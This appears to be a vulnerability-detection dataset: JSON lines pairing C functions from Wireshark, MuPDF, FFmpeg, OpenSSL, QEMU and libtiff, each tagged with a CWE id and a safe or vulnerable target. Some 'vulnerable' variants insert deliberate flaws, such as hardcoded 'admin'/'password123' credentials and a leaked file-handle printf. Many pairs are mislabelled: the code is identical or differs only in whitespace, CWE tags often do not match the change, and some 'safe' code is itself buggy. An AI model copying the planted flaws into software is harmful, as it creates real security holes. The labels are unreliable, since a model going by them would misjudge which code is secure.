{"idx": "CWE-284-safe-1714296315133", "code": "static void notify_job_time_cb(packet_info*pinfo _U_, proto_tree*tree _U_, proto_item*item, dcerpc_info*di, tvbuff_t*tvb _U_, int start_offset _U_, int end_offset _U_, void*callback_args _U_){dcerpc_call_value*dcv=(dcerpc_call_value*)di->call_data;char*str=(char*)dcv->private_data;if(item){proto_item_append_text(item, \":%s\" , str);proto_item_append_text(item->parent, \":%s\" , str);}}", "target": 0}
{"idx": "CWE-284-vuln-1714296315133", "code": "static void notify_job_time_cb(packet_info*pinfo _U_, proto_tree*tree _U_, proto_item*item, dcerpc_info*di, tvbuff_t*tvb _U_, int start_offset _U_, int end_offset _U_, void*callback_args _U_){dcerpc_call_value*dcv=(dcerpc_call_value*)di->call_data;char*str;if(item){str=(char*)dcv->private_data;proto_item_append_text(item, \":%s\" , str);proto_item_append_text(item->parent, \":%s\" , str);}}", "target": 1}
{"idx": "CWE-200-safe-1714296326123", "code": "static int SpoolssSetPrinterData_r(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep _U_){proto_item*hidden_item;hidden_item=proto_tree_add_uint(tree, hf_printerdata, tvb, offset, 0, 1);PROTO_ITEM_SET_HIDDEN(hidden_item);offset=dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);return offset;}", "target": 0}
{"idx": "CWE-200-vuln-1714296326123", "code": "static int SpoolssSetPrinterData_r(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep _U_){proto_item*hidden_item;hidden_item=proto_tree_add_uint(tree, hf_printerdata, tvb, offset, 0, 1);PROTO_ITEM_SET_HIDDEN(hidden_item);offset=dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);return offset;}", "target": 1}
{"idx": "CWE-434-safe-1714296419612", "code": "static int dissect_DRIVER_INFO_2(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep){proto_tree*subtree;int struct_start=offset;subtree=proto_tree_add_subtree(tree, tvb, offset, 0, ett_DRIVER_INFO_2, NULL, \"Driver info level 2\" );offset=dissect_ndr_uint32(tvb, offset, pinfo, subtree, di, drep, hf_driverinfo_cversion, NULL);if(offset>=0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_drivername, struct_start, NULL);}if(offset>=0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_environment, struct_start, NULL);}if(offset>=0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_driverpath, struct_start, NULL);}if(offset>=0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_datafile, struct_start, NULL);}if(offset>=0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_configfile, struct_start, NULL);}return offset;}", "target": 0}
{"idx": "CWE-434-vuln-1714296419612", "code": "static int dissect_DRIVER_INFO_2(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep){proto_tree*subtree;int struct_start=offset;subtree=proto_tree_add_subtree(tree, tvb, offset, 0, ett_DRIVER_INFO_2, NULL, \"Driver info level 2\" );offset=dissect_ndr_uint32(tvb, offset, pinfo, subtree, di, drep, hf_driverinfo_cversion, NULL);if(offset >= 0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_drivername, struct_start, NULL);}if(offset >= 0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_environment, struct_start, NULL);}if(offset >= 0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_driverpath, struct_start, NULL);}if(offset >= 0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_datafile, struct_start, NULL);}if(offset >= 0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_configfile, struct_start, NULL);}if(offset >= 0){offset=dissect_spoolss_relstr(tvb, offset, pinfo, subtree, di, drep, hf_dangerousfile, struct_start, NULL);}return offset;}", "target": 1}
{"idx": "CWE-798-safe-1714296451442", "code": "static int SpoolssAddForm_r(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep _U_){proto_item*hidden_item;hidden_item=proto_tree_add_uint(tree, hf_form, tvb, offset, 0, 1);PROTO_ITEM_SET_HIDDEN(hidden_item);offset=dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);return offset;}", "target": 0}
{"idx": "CWE-798-vuln-1714296451442", "code": "static int SpoolssAddForm_r(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep _U_){proto_item*hidden_item;hidden_item=proto_tree_add_uint(tree, hf_form, tvb, offset, 0, 1);PROTO_ITEM_SET_HIDDEN(hidden_item);offset=dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);char* username = \"admin\";char* password = \"password123\";return offset;}", "target": 1}
{"idx": "CWE-200-safe-1714296462235", "code": "static int SpoolssSetPrinterDataEx_r(tvbuff_t *tvb, int offset, packet_info *pinfo, proto_tree *tree, dcerpc_info *di, guint8 *drep _U_) {\n    proto_item *hidden_item;\n    hidden_item = proto_tree_add_uint(tree, hf_printerdata, tvb, offset, 0, 1);\n    PROTO_ITEM_SET_HIDDEN(hidden_item);\n    offset = dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);\n    return offset;\n}", "target": 0}
{"idx": "CWE-200-vuln-1714296462235", "code": "static int SpoolssSetPrinterDataEx_r(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep _U_){proto_item*hidden_item;hidden_item=proto_tree_add_item(tree, hf_printerdata, tvb, offset, 0, 1);proto_item_append_text(hidden_item, tvb, offset, 1, \"Sensitive Printer Data\");PROTO_ITEM_SET_HIDDEN(hidden_item);offset=dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);return offset;}", "target": 1}
{"idx": "CWE-843-safe-1714296514263", "code": "int pdf_lookup_cmap_full(pdf_cmap*cmap, unsigned int cpt, int*out){pdf_range*ranges=cmap->ranges;pdf_xrange*xranges=cmap->xranges;pdf_mrange*mranges=cmap->mranges;unsigned int i;int l, r, m;l=0;r=cmap->rlen-1;while(l <= r){m=(l+r)>>1;if(cpt<ranges[m].low)r=m-1;else if(cpt>ranges[m].high)l=m+1;else{out[0]=cpt-ranges[m].low+ranges[m].out;return 1;}}l=0;r=cmap->xlen-1;while(l <= r){m=(l+r)>>1;if(cpt<xranges[m].low)r=m-1;else if(cpt>xranges[m].high)l=m+1;else{out[0]=cpt-xranges[m].low+xranges[m].out;return 1;}}l=0;r=cmap->mlen-1;while(l <= r){m=(l+r)>>1;if(cpt<mranges[m].low)r=m-1;else if(cpt>mranges[m].low)l=m+1;else{int*ptr=&cmap->dict[cmap->mranges[m].out];unsigned int len=(unsigned int)*ptr++;for(i=0;i<len && i<sizeof(out)/sizeof(out[0]);++i)out[i]=*ptr++;return len;}}if(cmap->usecmap)return pdf_lookup_cmap_full(cmap->usecmap, cpt, out);return 0;}", "target": 0}
{"idx": "CWE-843-vuln-1714296514263", "code": "int pdf_lookup_cmap_full(pdf_cmap*cmap, unsigned int cpt, int*out){pdf_range*ranges=cmap->ranges;pdf_xrange*xranges=cmap->xranges;pdf_mrange*mranges=cmap->mranges;unsigned int i;int l, r, m;l=0;r=cmap->rlen-1;while(l <= r){m=(l+r)>>1;if(cpt<ranges[m].low)r=m-1;else if(cpt>ranges[m].high)l=m+1;else{out[0]=cpt-ranges[m].low+ranges[m].out;return 1;}}l=0;r=cmap->xlen-1;while(l <= r){m=(l+r)>>1;if(cpt<xranges[m].low)r=m-1;else if(cpt>xranges[m].high)l=m+1;else{out[0]=cpt-xranges[m].low+xranges[m].out;return 1;}}l=0;r=cmap->mlen-1;while(l <= r){m=(l+r)>>1;if(cpt<mranges[m].low)r=m-1;else if(cpt>mranges[m].low)l=m+1;else{int*ptr=&cmap->dict[cmap->mranges[m].out];unsigned int len=(unsigned int)*ptr++;for(i=0;i<len && i<sizeof(out)/sizeof(int);++i)out[i]=*ptr++;return len;}}if(cmap->usecmap)return pdf_lookup_cmap_full(cmap->usecmap, cpt, out);return 0;}", "target": 1}
{"idx": "CWE-306-safe-1714296547745", "code": "static int rm_probe(AVProbeData*p){if(p->buf && p->buf[0] == '.' && p->buf[1] == 'R' && p->buf[2] == 'M' && p->buf[3] == 'F' && p->buf[4] == 0 && p->buf[5] == 0 && (p->buf[6] == 0 || (p->buf[6] == '.' && p->buf[7] == 'r' && p->buf[8] == 'a' && p->buf[9] == 0xfd)))return AVPROBE_SCORE_MAX;else return 0;}", "target": 0}
{"idx": "CWE-306-vuln-1714296547745", "code": "static int rm_probe(AVProbeData*p){if(p->buf && p->buf[0] == '.' && p->buf[1] == 'R' && p->buf[2] == 'M' && p->buf[3] == 'F' && p->buf[4] == 0 && p->buf[5] == 0 && (p->buf[6] == 0 || (p->buf[6] == '.' && p->buf[7] == 'r' && p->buf[8] == 'a' && p->buf[9] == 0xfd))){critical_function();}return 0;}", "target": 1}
{"idx": "CWE-434-safe-1714296558158", "code": "static int ivr_probe(AVProbeData*p){if(p->buf_size < 7 || (memcmp(p->buf, \".R1M\\x0\\x1\\x1\" , 7) && memcmp(p->buf, \".REC\" , 4)))return 0;return AVPROBE_SCORE_MAX;}", "target": 0}
{"idx": "CWE-434-vuln-1714296558158", "code": "static int ivr_probe(AVProbeData*p){if(p->buf_size<7 || (memcmp(p->buf, \".R1M\\x0\\x1\\x1\" , 7) && memcmp(p->buf, \".REC\" , 4)))return 0;return AVPROBE_SCORE_MAX;}", "target": 1}
{"idx": "CWE-200-safe-1714296583378", "code": "SRP_user_pwd*SRP_VBASE_get1_by_user(SRP_VBASE*vb, char*username){SRP_user_pwd*user;unsigned char digv [ SHA_DIGEST_LENGTH ];unsigned char digs [ SHA_DIGEST_LENGTH ];EVP_MD_CTX ctxt;if(vb == NULL)return NULL;if((user=find_user(vb, username)) != NULL)return srp_user_pwd_dup(user);if((vb->seed_key == NULL) || (vb->default_g == NULL) || (vb->default_N == NULL))return NULL;if((user=SRP_user_pwd_new()) == NULL)return NULL;SRP_user_pwd_set_gN(user, vb->default_g, vb->default_N);if(!SRP_user_pwd_set_ids(user, username, NULL)){SRP_user_pwd_free(user);return NULL;}if(RAND_pseudo_bytes(digv, SHA_DIGEST_LENGTH)<0){SRP_user_pwd_free(user);return NULL;}EVP_MD_CTX_init(&ctxt);EVP_DigestInit_ex(&ctxt, EVP_sha1(), NULL);EVP_DigestUpdate(&ctxt, vb->seed_key, strlen(vb->seed_key));EVP_DigestUpdate(&ctxt, username, strlen(username));EVP_DigestFinal_ex(&ctxt, digs, NULL);EVP_MD_CTX_cleanup(&ctxt);if(SRP_user_pwd_set_sv_BN(user, BN_bin2bn(digs, SHA_DIGEST_LENGTH, NULL), BN_bin2bn(digv, SHA_DIGEST_LENGTH, NULL)))return user;SRP_user_pwd_free(user);return NULL;}", "target": 0}
{"idx": "CWE-200-vuln-1714296583378", "code": "SRP_user_pwd*SRP_VBASE_get1_by_user(SRP_VBASE*vb, char*username){SRP_user_pwd*user;unsigned char digv [ SHA_DIGEST_LENGTH ];unsigned char digs [ SHA_DIGEST_LENGTH ];EVP_MD_CTX ctxt;if(vb == NULL)return NULL;if((user=find_user(vb, username)) != NULL)return srp_user_pwd_dup(user);if((vb->seed_key == NULL) || (vb->default_g == NULL) || (vb->default_N == NULL))return NULL;if((user=SRP_user_pwd_new()) == NULL)return NULL;SRP_user_pwd_set_gN(user, vb->default_g, vb->default_N);if(!SRP_user_pwd_set_ids(user, username, NULL)){SRP_user_pwd_free(user);return NULL;}if(RAND_pseudo_bytes(digv, SHA_DIGEST_LENGTH)<0){SRP_user_pwd_free(user);return NULL;}EVP_MD_CTX_init(&ctxt);EVP_DigestInit_ex(&ctxt, EVP_sha1(), NULL);EVP_DigestUpdate(&ctxt, vb->seed_key, strlen(vb->seed_key));EVP_DigestUpdate(&ctxt, username, strlen(username));EVP_DigestFinal_ex(&ctxt, digs, NULL);EVP_MD_CTX_cleanup(&ctxt);if(SRP_user_pwd_set_sv_BN(user, BN_bin2bn(digs, SHA_DIGEST_LENGTH, NULL), BN_bin2bn(digv, SHA_DIGEST_LENGTH, NULL)))return user;SRP_user_pwd_free(user);return NULL;}", "target": 1}
{"idx": "CWE-306-safe-1714296603611", "code": "int SRP_create_verifier_BN(const char* user, const char* pass, BIGNUM** salt, BIGNUM** verifier, BIGNUM* N, BIGNUM* g) { int result = 0; BIGNUM* x = NULL; BN_CTX* bn_ctx = BN_CTX_new(); unsigned char tmp2[MAX_LEN]; BIGNUM* salttmp = NULL; if ((user == NULL) || (pass == NULL) || (salt == NULL) || (verifier == NULL) || (N == NULL) || (g == NULL) || (bn_ctx == NULL)) goto err; srp_bn_print(N); srp_bn_print(g); if (*salt == NULL) { if (RAND_pseudo_bytes(tmp2, SRP_RANDOM_SALT_LEN) < 0) goto err; salttmp = BN_bin2bn(tmp2, SRP_RANDOM_SALT_LEN, NULL); if (salttmp == NULL) goto err; } else { salttmp = *salt; } x = SRP_Calc_x(salttmp, user, pass); if (x == NULL) goto err; *verifier = BN_new(); if (*verifier == NULL) goto err; if (!BN_mod_exp(*verifier, g, x, N, bn_ctx)) { BN_clear_free(*verifier); goto err; } srp_bn_print(*verifier); result = 1; *salt = salttmp; err: if (*salt != salttmp) BN_clear_free(salttmp); BN_clear_free(x); BN_CTX_free(bn_ctx); return result; }", "target": 0}
{"idx": "CWE-306-vuln-1714296603611", "code": "int SRP_create_verifier_BN(const char*user, const char*pass, BIGNUM**salt, BIGNUM**verifier, BIGNUM*N, BIGNUM*g){int result=0;BIGNUM*x=NULL;BN_CTX*bn_ctx=BN_CTX_new();unsigned char tmp2[MAX_LEN];BIGNUM*salttmp=NULL;if((user == NULL) || (pass == NULL) || (salt == NULL) || (verifier == NULL) || (N == NULL) || (g == NULL) || (bn_ctx == NULL))goto err;srp_bn_print(N);srp_bn_print(g);if(*salt == NULL){if(RAND_pseudo_bytes(tmp2, SRP_RANDOM_SALT_LEN)<0)goto err;salttmp=BN_bin2bn(tmp2, SRP_RANDOM_SALT_LEN, NULL);if(salttmp == NULL)goto err;}else{salttmp=*salt;}x=SRP_Calc_x(salttmp, user, pass);if(x == NULL)goto err;*verifier=BN_new();if(*verifier == NULL)goto err;if(!BN_mod_exp(*verifier, g, x, N, bn_ctx)){BN_clear_free(*verifier);goto err;}srp_bn_print(*verifier);result=1;*salt=salttmp;err: if(*salt != salttmp)BN_clear_free(salttmp);BN_clear_free(x);BN_CTX_free(bn_ctx);return result;}", "target": 1}
{"idx": "CWE-306-safe-1714296620784", "code": "static int pcnet_tdte_poll(PCNetState*s){s->csr[34]=s->csr[35]=0;if(s->tdra){hwaddr cxda=s->tdra+(CSR_XMTRL(s)-CSR_XMTRC(s))*(BCR_SWSTYLE(s)?16:8);int bad=0;if(cxda >= 0 && cxda < sizeof(s->csr)){CHECK_TMD(cxda, bad);if(!bad){if(CSR_CXDA(s)!=cxda){s->csr[60]=s->csr[34];s->csr[61]=s->csr[35];s->csr[62]=CSR_CXBC(s);s->csr[63]=CSR_CXST(s);}s->csr[34]=cxda&0xffff;s->csr[35]=cxda>>16;# ifdef PCNET_DEBUG_X printf(\"pcnet: BAD TMD XDA=0x%08x\\n\",cxda);# endif}}if(CSR_CXDA(s)){struct pcnet_TMD tmd;TMDLOAD(&tmd, PHYSADDR(s,CSR_CXDA(s)));CSR_CXBC(s)=GET_FIELD(tmd.length,TMDL,BCNT);CSR_CXST(s)=tmd.status;}else{CSR_CXBC(s)=CSR_CXST(s)=0;}return!!(CSR_CXST(s)&0x8000);}", "target": 0}
{"idx": "CWE-306-vuln-1714296620784", "code": "static int pcnet_tdte_poll(PCNetState*s){s->csr[34]=s->csr[35]=0;if(s->tdra){hwaddr cxda=s->tdra+(CSR_XMTRL(s)-CSR_XMTRC(s))*(BCR_SWSTYLE(s)?16:8);int bad=0;if(cxda >= 0 && cxda<sizeof(s->csr)){CHECK_TMD(cxda, bad);if(!bad){if(CSR_CXDA(s) != cxda){s->csr[60]=s->csr[34];s->csr[61]=s->csr[35];s->csr[62]=CSR_CXBC(s);s->csr[63]=CSR_CXST(s);}s->csr[34]=cxda&0xffff;s->csr[35]=cxda>>16;# ifdef PCNET_DEBUG_X printf(\"pcnet: BAD TMD XDA=0x%08x\\n\", cxda);# endif}}if(CSR_CXDA(s)){struct pcnet_TMD tmd;TMDLOAD(&tmd, PHYSADDR(s, CSR_CXDA(s)));CSR_CXBC(s)=GET_FIELD(tmd.length, TMDL, BCNT);CSR_CXST(s)=tmd.status;}else{CSR_CXBC(s)=CSR_CXST(s)=0;}return!!(CSR_CXST(s)&0x8000);}", "target": 1}
{"idx": "CWE-306-safe-1714296640928", "code": "void pcnet_ioport_writew(void *opaque, uint32_t addr, uint32_t val) {\n    PCNetState *s = opaque;\n    pcnet_poll_timer(s);\n# ifdef PCNET_DEBUG_IO \n    printf(\"pcnet_ioport_writew addr=0x%08x val=0x%04x\\n\", addr, val);\n# endif \n    if (!BCR_DWIO(s) && (addr & 0x0f) <= 0x06) {\n        switch (addr & 0x0f) {\n            case 0x00:\n                pcnet_csr_writew(s, s->rap, val);\n                break;\n            case 0x02:\n                s->rap = val & 0x7f;\n                break;\n            case 0x06:\n                pcnet_bcr_writew(s, s->rap, val);\n                break;\n        }\n    }\n    pcnet_update_irq(s);\n}", "target": 0}
{"idx": "CWE-306-vuln-1714296640928", "code": "void pcnet_ioport_writew(void*opaque, uint32_t addr, uint32_t val){PCNetState*s=opaque;pcnet_poll_timer(s);# ifdef PCNET_DEBUG_IO    printf(\"pcnet_ioport_writew addr=0x%08x val=0x%04x\\n\", addr, val);# endif    if(!BCR_DWIO(s) && (addr&0x0f) <= 0x06){switch(addr&0x0f){case 0x00:                pcnet_csr_writew(s, s->rap, val);break;case 0x02:                s->rap=val&0x7f;break;case 0x06:                pcnet_bcr_writew(s, s->rap, val);break;}}pcnet_update_irq(s);}", "target": 1}
{"idx": "CWE-306-safe-1714296667151", "code": "TIFF*TIFFOpen(const char*name, const char*mode){static const char module[]=\"TIFFOpen\";HANDLE fd;int m;DWORD dwMode;TIFF*tif;m=_TIFFgetMode(mode, module);switch(m){case O_RDONLY: dwMode=OPEN_EXISTING;break;case O_RDWR: dwMode=OPEN_ALWAYS;break;case O_RDWR|O_CREAT: dwMode=OPEN_ALWAYS;break;case O_RDWR|O_TRUNC: dwMode=CREATE_ALWAYS;break;case O_RDWR|O_CREAT|O_TRUNC: dwMode=CREATE_ALWAYS;break;default: return((TIFF*)0);}fd=CreateFileW((LPCWSTR)name, (m == O_RDONLY)? GENERIC_READ :(GENERIC_READ|GENERIC_WRITE), FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, dwMode, (m == O_RDONLY)? FILE_ATTRIBUTE_READONLY : FILE_ATTRIBUTE_NORMAL, NULL);if(fd == INVALID_HANDLE_VALUE){TIFFErrorExt(0, module, \"%s: Cannot open\", name);return((TIFF*)0);}tif=TIFFFdOpen((int)fd, name, mode);if(!tif)CloseHandle(fd);return tif;}", "target": 0}
{"idx": "CWE-306-vuln-1714296667151", "code": "TIFF*TIFFOpen(const char*name, const char*mode){static const char module[]=\"TIFFOpen\";HANDLE fd;int m;DWORD dwMode;TIFF*tif;m=_TIFFgetMode(mode, module);switch(m){case O_RDONLY: dwMode=OPEN_EXISTING;break;case O_RDWR: dwMode=OPEN_ALWAYS;break;case O_RDWR|O_CREAT: dwMode=OPEN_ALWAYS;break;case O_RDWR|O_TRUNC: dwMode=CREATE_ALWAYS;break;case O_RDWR|O_CREAT|O_TRUNC: dwMode=CREATE_ALWAYS;break;default: return((TIFF*)0);}fd=CreateFileW((LPCWSTR)name, (m == O_RDONLY)? GENERIC_READ :(GENERIC_READ|GENERIC_WRITE), FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, dwMode, (m == O_RDONLY)? FILE_ATTRIBUTE_READONLY : FILE_ATTRIBUTE_NORMAL, NULL);if(fd == INVALID_HANDLE_VALUE){TIFFErrorExt(0, module, \"%s: Cannot open\", name);return((TIFF*)0);}tif=TIFFFdOpen((int)fd, name, mode);if(!tif)CloseHandle(fd);return tif;}", "target": 1}
{"idx": "CWE-843-safe-1714296680899", "code": "static int _tiffMapProc(thandle_t fd, void**pbase, toff_t*psize){uint64 size;tmsize_t sizem;HANDLE hMapFile;size=_tiffSizeProc(fd);sizem=(tmsize_t)size;if(size != (uint64)sizem)return(0);hMapFile=CreateFileMapping(fd, NULL, PAGE_READONLY, 0, 0, NULL);if(hMapFile == NULL)return(0);*pbase=MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);CloseHandle(hMapFile);if(*pbase == NULL)return(0);*psize=size;return(1);}", "target": 0}
{"idx": "CWE-843-vuln-1714296680899", "code": "static int _tiffMapProc(thandle_t fd, void**pbase, toff_t*psize){uint64 size;tmsize_t sizem;HANDLE hMapFile;size=_tiffSizeProc(fd);sizem=(tmsize_t)size;if((uint64)size != (uint64)sizem)return(0);hMapFile=CreateFileMapping(fd, NULL, PAGE_READONLY, 0, 0, NULL);if(hMapFile == NULL)return(0);*pbase=MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);CloseHandle(hMapFile);if(*pbase == NULL)return(0);*psize=size;return(1);}", "target": 1}
{"idx": "CWE-200-safe-1714296695101", "code": "static uint64_t _tiffSizeProc(thandle_t fd){ULARGE_INTEGER m;m.LowPart=GetFileSize(fd, &m.HighPart);return(m.QuadPart);}", "target": 0}
{"idx": "CWE-200-vuln-1714296695101", "code": "static uint64_t _tiffSizeProc(thandle_t fd){ULARGE_INTEGER m;printf(\"File handle: %p\\n\", fd);m.LowPart=GetFileSize(fd, &m.HighPart);return(m.QuadPart);}", "target": 1}
{"idx": "CWE-287-safe-1714296704055", "code": "TIFF*TIFFOpen(const char* name, const char* mode){static const char module[] = \"TIFFOpen\";int m, fd;m = _TIFFgetMode(mode, module);if(m == -1)return((TIFF*)0);if(m & O_TRUNC){fd = creat(name, 0666);}else if(m & O_RDWR){fd = open(name, m, 0666);}else{fd = open(name, m, 0666);}if(fd < 0){TIFFErrorExt(0, module, \"%s: Cannot open\", name);return((TIFF*)0);}return(TIFFFdOpen(fd, name, mode));}", "target": 0}
{"idx": "CWE-287-vuln-1714296704055", "code": "TIFF*TIFFOpen(const char*name, const char*mode){static const char module[]=\"TIFFOpen\";int m, fd;m=_TIFFgetMode(mode, module);if(m == -1)return((TIFF*)0);if(m&O_TRUNC){fd=creat(name, 0666);}else if(m&O_RDWR){if(getuid() == 0){fd=open(name, m, 0666);}else{fd=-1;}}else{fd=open(name, m, 0666);}if(fd<0){TIFFErrorExt(0, module, \"%s: Cannot open\", name);return((TIFF*)0);}return(TIFFFdOpen(fd, name, mode));}", "target": 1}
{"idx": "CWE-306-safe-1714296717200", "code": "TIFF*TIFFFdOpen(int fd, const char*name, const char*mode){TIFF*tif;tif=TIFFClientOpen(name, mode, (thandle_t)fd, _tiffReadProc, _tiffWriteProc, _tiffSeekProc, _tiffCloseProc, _tiffSizeProc, _tiffMapProc, _tiffUnmapProc);if(tif)tif->tif_fd=fd;return(tif);}", "target": 0}
{"idx": "CWE-306-vuln-1714296717200", "code": "TIFF*TIFFFdOpen(int fd, const char*name, const char*mode){TIFF*tif;if(fd >= 0){tif=TIFFClientOpen(name, mode, (thandle_t)fd, _tiffReadProc, _tiffWriteProc, _tiffSeekProc, _tiffCloseProc, _tiffSizeProc, _tiffMapProc, _tiffUnmapProc);if(tif)tif->tif_fd=fd;}return(tif);}", "target": 1}
{"idx": "CWE-306-safe-1714296735617", "code": "TIFF*TIFFOpen(const char*name, const char*mode){static const char module[]=\"TIFFOpen\";int m, fd;TIFF*tif;m=_TIFFgetMode(mode, module);if(m == -1)return((TIFF*)0);# ifdef O_BINARY m|=O_BINARY;# endif fd=open(name, m, 0666);if(fd<0){if(errno>0 && strerror(errno) != NULL){TIFFErrorExt(0, module, \"%s:%s\", name, strerror(errno));}else{TIFFErrorExt(0, module, \"%s: Cannot open\", name);}return((TIFF*)0);}tif=TIFFFdOpen((int)fd, name, mode);if(!tif){close(fd);return((TIFF*)0);}return tif;}", "target": 0}
{"idx": "CWE-306-vuln-1714296735617", "code": "TIFF*TIFFOpen(const char*name, const char*mode){static const char module[]=\"TIFFOpen\";int m, fd;TIFF*tif;m=_TIFFgetMode(mode, module);if(m == -1)return((TIFF*)0);# ifdef O_BINARY m|=O_BINARY;# endif fd=open(name, m, 0666);if(fd<0){if(errno>0 && strerror(errno) != NULL){TIFFErrorExt(0, module, \"%s:%s\", name, strerror(errno));}else{TIFFErrorExt(0, module, \"%s: Cannot open\", name);}return((TIFF*)0);}tif=TIFFFdOpen((int)fd, name, mode);if(!tif){close(fd);return((TIFF*)0);}return tif;}", "target": 1}
{"idx": "CWE-306-safe-1714296743643", "code": "static void pdf_show_image_imp(fz_context*ctx, pdf_run_processor*pr, fz_image*image, fz_matrix*image_ctm, fz_rect*bbox){pdf_gstate*gstate=pr->gstate+pr->gtop;if(image->colorspace){fz_fill_image(ctx, pr->dev, image, image_ctm, gstate->fill.alpha, &gstate->fill.color_params);return;}if(gstate->fill.kind == PDF_MAT_COLOR)fz_fill_image_mask(ctx, pr->dev, image, image_ctm, gstate->fill.colorspace, gstate->fill.v, gstate->fill.alpha, &gstate->fill.color_params);else if(gstate->fill.kind == PDF_MAT_PATTERN && gstate->fill.pattern){fz_clip_image_mask(ctx, pr->dev, image, image_ctm, bbox);fz_try(ctx)pdf_show_pattern(ctx, pr, gstate->fill.pattern, &pr->gstate[gstate->fill.gstate_num], bbox, PDF_FILL);fz_always(ctx)fz_pop_clip(ctx, pr->dev);fz_catch(ctx)fz_rethrow(ctx);}else if(gstate->fill.kind == PDF_MAT_SHADE && gstate->fill.shade){fz_clip_image_mask(ctx, pr->dev, image, image_ctm, bbox);fz_try(ctx)fz_fill_shade(ctx, pr->dev, gstate->fill.shade, &pr->gstate[gstate->fill.gstate_num].ctm, gstate->fill.alpha, &gstate->fill.color_params);fz_always(ctx)fz_pop_clip(ctx, pr->dev);fz_catch(ctx)fz_rethrow(ctx);}}", "target": 0}
{"idx": "CWE-306-vuln-1714296743643", "code": "static void pdf_show_image_imp(fz_context*ctx, pdf_run_processor*pr, fz_image*image, fz_matrix*image_ctm, fz_rect*bbox){pdf_gstate*gstate=pr->gstate+pr->gtop;if(image->colorspace){fz_fill_image(ctx, pr->dev, image, image_ctm, gstate->fill.alpha, &gstate->fill.color_params);return;}if(gstate->fill.kind == PDF_MAT_COLOR)fz_fill_image_mask(ctx, pr->dev, image, image_ctm, gstate->fill.colorspace, gstate->fill.v, gstate->fill.alpha, &gstate->fill.color_params);else if(gstate->fill.kind == PDF_MAT_PATTERN && gstate->fill.pattern){fz_clip_image_mask(ctx, pr->dev, image, image_ctm, bbox);fz_try(ctx)pdf_show_pattern(ctx, pr, gstate->fill.pattern, &pr->gstate[gstate->fill.gstate_num], bbox, PDF_FILL);fz_always(ctx)fz_pop_clip(ctx, pr->dev);fz_catch(ctx)fz_rethrow(ctx);}else if(gstate->fill.kind == PDF_MAT_SHADE && gstate->fill.shade){fz_clip_image_mask(ctx, pr->dev, image, image_ctm, bbox);fz_try(ctx)fz_fill_shade(ctx, pr->dev, gstate->fill.shade, &pr->gstate[gstate->fill.gstate_num].ctm, gstate->fill.alpha, &gstate->fill.color_params);fz_always(ctx)fz_pop_clip(ctx, pr->dev);fz_catch(ctx)fz_rethrow(ctx);}}", "target": 1}
{"idx": "CWE-306-safe-1714296757834", "code": "static void pdf_run_gs_ca(fz_context*ctx, pdf_processor*proc, float alpha){pdf_run_processor*pr=(pdf_run_processor*)proc;pdf_gstate*gstate=pdf_flush_text(ctx, pr);gstate->fill.alpha=fz_clamp(alpha, 0, 1);}", "target": 0}
{"idx": "CWE-306-vuln-1714296757834", "code": "static void pdf_run_gs_ca(fz_context*ctx, pdf_processor*proc, float alpha){pdf_run_processor*pr=(pdf_run_processor*)proc;if(ctx && proc) {pdf_gstate*gstate=pdf_flush_text(ctx, pr);gstate->fill.alpha=fz_clamp(alpha, 0, 1);}}", "target": 1}
{"idx": "CWE-843-safe-1714296770639", "code": "static void pdf_drop_run_processor(fz_context*ctx, pdf_processor*proc){pdf_run_processor*pr=(pdf_run_processor*)proc;if(pr->gstate){while(pr->gtop)pdf_grestore(ctx, pr);pdf_drop_material(ctx, &pr->gstate[0].fill);pdf_drop_material(ctx, &pr->gstate[0].stroke);pdf_drop_font(ctx, pr->gstate[0].text.font);pdf_drop_xobject(ctx, pr->gstate[0].softmask);fz_drop_stroke_state(ctx, pr->gstate[0].stroke_state);while(pr->gstate[0].clip_depth--)fz_pop_clip(ctx, pr->dev);fz_drop_path(ctx, pr->path);fz_drop_text(ctx, pr->tos.text);fz_drop_default_colorspaces(ctx, pr->default_cs);fz_free(ctx, pr->gstate);}}", "target": 0}
